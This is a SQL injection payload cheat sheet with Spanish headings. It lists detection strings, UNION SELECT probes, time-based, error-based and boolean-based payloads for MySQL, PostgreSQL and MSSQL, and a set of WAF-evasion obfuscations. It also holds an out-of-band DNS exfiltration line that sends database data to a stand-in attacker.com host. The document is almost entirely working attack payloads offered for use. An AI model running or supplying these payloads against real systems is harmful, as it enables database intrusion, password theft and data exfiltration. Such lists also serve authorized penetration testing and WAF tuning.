# sql_injection_payloads

---

# ======================================================
# SQL INJECTION PAYLOADS (con ofuscación para WAF)
# ======================================================

# ------- DETECCIÓN (universal) -------
'
"
' OR '1'='1
' OR 1=1 --
admin' --
' AND SLEEP(5)--
' AND 1=1 --
' AND 1=2 --

# Ofuscación con comentarios
'/**/OR/**/1=1--
'||'1'||'='||'1

# ------- UNION SELECT (MySQL / Postgres) -------
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,@@version,NULL--
' UNION SELECT NULL,table_name FROM information_schema.tables--

# Ofuscación con variantes de CASE
' UNION SELECT CASE WHEN 1=1 THEN NULL ELSE NULL END--

# ------- TIME-BASED (MySQL) ----
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

# Time-based ofuscado con BENCHMARK
' AND BENCHMARK(10000000,MD5('a'))--

# ------- TIME-BASED (PostgreSQL) ----
' AND pg_sleep(5)--
' OR 1=1; SELECT pg_sleep(5)--

# ------- TIME-BASED (MSSQL) ----
' WAITFOR DELAY '00:00:05'--
' OR 1=1; WAITFOR DELAY '00:00:05'--

# ------- ERROR-BASED (MySQL) ----
' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--
' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1)--
' AND GTID_SUBSET(CONCAT(0x7e, VERSION()), 1)--

# ------- ERROR-BASED (PostgreSQL) ----
' AND 1=CAST(version() AS int)--

# ------- BOOLEAN-BASED ----
' AND SUBSTRING(password,1,1) = 'a'--
' OR ASCII(SUBSTRING(username,1,1)) > 97--

# ------- OUT-OF-BAND (DNS exfiltración, MySQL) ----
' AND LOAD_FILE(CONCAT('\\\\', VERSION(), '.attacker.com\\a'))--

# ------- WAF EVASION TÉCNICAS --------
# Usar doble codificación URL
%2527%2520OR%2520%25271%2527%2520%253D%2520%25271

# Comentarios anidados (MySQL)
'/*!50000OR*/1=1--

# Concatenación con variables
' OR 'a'='a' AND SLEEP(5)--
' OR 1=1 AND SLEEP(5)--

# Uso de caracteres de tabulación / newline
' OR 1=1\nAND\nSLEEP(5)--

# Sustituir espacios por /**/(comentarios multilínea)
'/**/OR/**/1=1/**/--

# Mezcla mayúsculas/minúsculas
' oR 1=1 --

